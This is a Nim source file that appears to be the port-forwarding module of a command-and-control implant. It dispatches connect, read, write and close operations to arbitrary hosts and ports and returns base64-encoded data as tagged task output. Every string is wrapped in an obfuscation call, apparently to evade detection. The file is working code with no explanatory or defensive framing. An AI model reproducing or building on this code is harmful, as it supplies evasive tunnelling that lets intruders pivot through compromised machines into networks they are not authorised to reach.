import std/[json, base64]
import ../utils/global
import ../utils/network/portforward/core
import execution

proc jsonErr(msg: string): string =
  # Builds a json error object with the given message
  $(%*{(obf("ok")): false, (obf("error")): msg})

proc jsonOk(extra: JsonNode = newJObject()): string =
  # Builds a json ok object and copies the extra fields into it
  var o = %*{(obf("ok")): true}
  for k, v in extra.pairs:
    o[k] = v
  $o

proc runPassive(input, params: string): string =
  # Dispatches the port forward operation and returns the json result
  let op = input
  let p = parseJson(params)
  case op
  of obf("connect"):
    let key = p[obf("conn_id")].getStr()
    let err = pfConnect(key, p[obf("host")].getStr(), p[obf("port")].getInt())
    if err.len > 0:
      jsonErr(err)
    else:
      jsonOk(%*{(obf("conn_id")): key})
  of obf("read"):
    let cid = p[obf("conn_id")].getStr()
    let mx = if p.hasKey(obf("max")): p[obf("max")].getInt() else: 65536
    let (data, err) = pfRead(cid, mx)
    if err.len > 0:
      jsonErr(err)
    elif data.len == 0:
      jsonOk(%*{(obf("data")): obf("")})
    else:
      jsonOk(%*{(obf("data")): encode(data)})
  of obf("write"):
    let err = pfWrite(p[obf("conn_id")].getStr(), decode(p[obf("data")].getStr()))
    if err.len > 0:
      jsonErr(err)
    else:
      jsonOk()
  of obf("close"):
    pfClose(p[obf("conn_id")].getStr())
    jsonOk()
  else:
    jsonErr(obf("unknown op ") & op)

proc run*(host, taskTag, input, params: string; buf: var openArray[char]): int =
  # Entrypoint of the port forward route that writes the handler output
  discard host
  let payload = runPassive(input, params)
  writeMsg($( %*{
    obf("option"): obf("output"),
    obf("type"): obf("port_forwarding"),
    obf("task_tag"): taskTag,
    obf("output"): payload,
  }), buf)
